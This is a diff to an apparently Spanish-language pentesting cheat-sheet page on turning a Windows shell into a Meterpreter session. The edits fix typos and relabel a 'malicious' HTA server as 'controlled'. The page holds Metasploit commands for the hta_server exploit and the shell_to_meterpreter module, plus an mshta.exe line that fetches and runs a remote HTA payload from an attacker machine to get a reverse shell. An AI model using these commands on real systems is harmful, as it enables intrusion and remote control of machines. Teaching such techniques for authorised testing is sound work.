@@ -40,18 +40,18 @@
             </section>
             <section class="code-card">
               <h3>Metasploit: módulo</h3>
-              <pre><code>use post/multu/manage/shell_to_meterpreter</code></pre>
+              <pre><code>use post/multi/manage/shell_to_meterpreter</code></pre>
             </section>
             <h3>Windows Shell to Meterpreter</h3>
             <section class="code-card">
-              <h3>Metasploit: Servidor HTA malicioso</h3>
+              <h3>Metasploit: Servidor HTA controlado</h3>
               <pre><code>msfconsole -q
 use exploit/windows/misc/hta_server
 exploit</code></pre>
             </section>
             <section class="code-card">
-              <h3>Ejecutar el enlace del servidor hta malicioso en el servidor de destino para obtener el shell</h3>
-              <pre><code>mshta.exe ttp://&lt;ip_kali&gt;:8080/13FvvFCiaI4L.hta</code></pre>
+              <h3>Ejecutar el enlace del servidor HTA controlado en el servidor de destino para obtener la shell</h3>
+              <pre><code>mshta.exe http://&lt;ip_kali&gt;:8080/13FvvFCiaI4L.hta</code></pre>
             </section>
             <section class="code-card">
               <h3>Payload msfvenom</h3>
@@ -70,7 +70,7 @@ set payload windows/meterpreter/reverse_tcp
             </section>
             <section class="code-card">
               <h3>Metasploit: módulo</h3>
-              <pre><code>use post/multu/manage/shell_to_meterpreter</code></pre>
+              <pre><code>use post/multi/manage/shell_to_meterpreter</code></pre>
             </section>
             <h2>Tags</h2>
             <div class="tag-list">
